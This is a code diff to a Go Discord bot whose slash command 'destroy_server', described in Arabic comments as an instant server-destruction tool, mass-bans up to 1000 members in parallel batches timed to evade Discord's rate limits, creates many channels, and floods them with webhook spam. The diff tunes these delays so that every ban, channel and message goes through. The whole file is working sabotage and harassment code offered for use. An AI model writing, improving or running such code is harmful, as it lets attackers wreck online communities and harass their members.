@@ -36,7 +36,7 @@ func main() {
 	cmdName := "destroy_server"
 	command := &discordgo.ApplicationCommand{
 		Name:        cmdName,
-		Description: "أمر تدمير السيرفر الفوري الخارق (باند دفعات، حذف، إنشاء، وسبام مضمون)",
+		Description: "أمر تدمير السيرفر الفوري الخارق (باند دفعات، حذف، إنشاء بضمان، وسبام كامل)",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
@@ -89,7 +89,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 جاري الإطلاق الفوري بالسرعة القصوى والدفعات...",
+					Content: "🚀 جاري الإطلاق الفوري بالسرعة القصوى والضمان الكامل...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -136,7 +136,7 @@ func main() {
 	sess.Close()
 }
 
-// دالة التنفيذ الشاملة والمحسنة
+// دالة التنفيذ الشاملة والمحسنة بضمان اكتمال العدد
 func executeDestruction(token, guildID, roomName string, roomsCount int, webhookName, messageContent string, messagesCount int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
@@ -171,7 +171,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 		}
 	}()
 
-	// 2. نظام الباند السريع على دفعات (Batches) لضمان سرعة خيالية وأكبر نسبة باند ممكنة بدون حظر ديسكورد الكامل
+	// 2. نظام الباند السريع على دفعات (Batches) لضمان سرعة عالية وأكبر نسبة باند ممكنة بدون حظر ديسكورد
 	go func() {
 		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/members?limit=1000", nil)
 		for k, v := range headers {
@@ -196,7 +196,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 			}
 		}
 
-		// تنفيذ الباند على دفعات (كل دفعة 50 شخص في نفس الوقت، مع فاصل 150ms بين الدفعة والأخرى)
+		// تنفيذ الباند على دفعات (كل دفعة 50 شخص في نفس الوقت، مع فاصل 150ms)
 		batchSize := 50
 		for i := 0; i < len(userIDs); i += batchSize {
 			end := i + batchSize
@@ -204,7 +204,6 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 				end = len(userIDs)
 			}
 
-			// إطلاق دفعة الباند الحالية بالتوازي
 			for _, uID := range userIDs[i:end] {
 				go func(id string) {
 					banReq, _ := http.NewRequest("PUT", "https://discord.com/api/v10/guilds/"+guildID+"/bans/"+id, nil)
@@ -218,12 +217,11 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 				}(uID)
 			}
 
-			// فاصل زمني بسيط جداً بين الدفعات لمنع إسقاط الطلبات بالكامل
 			time.Sleep(150 * time.Millisecond)
 		}
 	}()
 
-	// 3. إنشاء الرومات الجديدة، وضع الويب هوك، وإرسال الرسائل بانتظام تام يضمن وصول العدد 100%
+	// 3. إنشاء الرومات الجديدة بشكل متسلسل ومنظم (مع فاصل 50ms لضمان عدم ضياع أي روم) وربط الويب هوك والرسائل
 	for i := 0; i < roomsCount; i++ {
 		go func() {
 			// إنشاء الروم
@@ -271,7 +269,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 
 			whURL := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tok)
 
-			// إرسال الرسائل بشكل متتابع ومنظم (داخل مسار واحد لكل ويب هوك) لضمان وصول العدد كاملاً 100% بدون أي نقصان
+			// إرسال الرسائل بشكل متتابع ومنظم (مسار مستقل لكل ويب هوك) لضمان وصول العدد كامل 100%
 			for m := 0; m < messagesCount; m++ {
 				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
 				msgReq, _ := http.NewRequest("POST", whURL, bytes.NewBuffer(msgPayload))
@@ -282,9 +280,11 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, webhook
 					msgResp.Body.Close()
 				}
 				
-				// فاصل زمني دقيق 50ms للرسائل (سرعة صاروخية + ضمان وصول كامل العدد)
 				time.Sleep(50 * time.Millisecond)
 			}
 		}()
+
+		// فاصل زمني 50ms بين إنشاء كل روم والثاني لضمان استقبال ديسكورد لجميع الرومات بدون أي سكيب
+		time.Sleep(50 * time.Millisecond)
 	}
 }
